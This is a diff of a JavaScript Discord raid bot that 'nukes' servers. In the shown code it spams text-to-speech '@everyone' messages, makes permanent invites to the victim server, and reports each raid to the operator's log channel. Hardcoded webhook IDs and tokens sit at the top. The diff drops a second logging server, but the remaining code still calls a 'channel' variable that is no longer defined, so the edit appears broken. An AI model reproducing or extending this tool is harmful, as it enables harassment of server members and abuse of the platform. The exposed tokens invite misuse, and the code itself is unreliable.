@@ -8,8 +8,7 @@ const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOS
 const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
 const guild = '782621562154254356'
 const logC = "782644045834747914"
-const guild2 = "783701239291838475"
-const logC2 = "801825691493728276"
+
 const axios = require('axios').default
 var pfp1 = "https://media.discordapp.net/attachments/789659659401297931/789660320447987752/Screenshot_163.png"
 var pfsp = 'https://images-ext-2.discordapp.net/external/aUiSNo-HOBkCWlAFFjkSpOA2ishUAp2UH7mIzPrsJ7Q/%3Fsize%3D256/https/cdn.discordapp.com/avatars/761192480833142797/2212cb8ef2edee9b30487a56db8306b1.png'
@@ -504,8 +503,6 @@ if(list.includes(msg.author.id)) {return}
             p.send(randomT() + " @everyone", {tts: true})
             spam++
         }
-                   const server = msg.client.guilds.cache.find(g => g.id === guild2)
-        const channel = server.channels.cache.find(c => c.id === logC2)
                   const server2 = msg.client.guilds.cache.find(g => g.id === guild)
         const channel2 = server2.channels.cache.find(c => c.id === logC)
 
@@ -521,7 +518,6 @@ const nukeEmbed = new Discord.MessageEmbed()
 p.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
 .then(invite => {
 channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`))
-channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
 })
              })
         while(number < 130) {
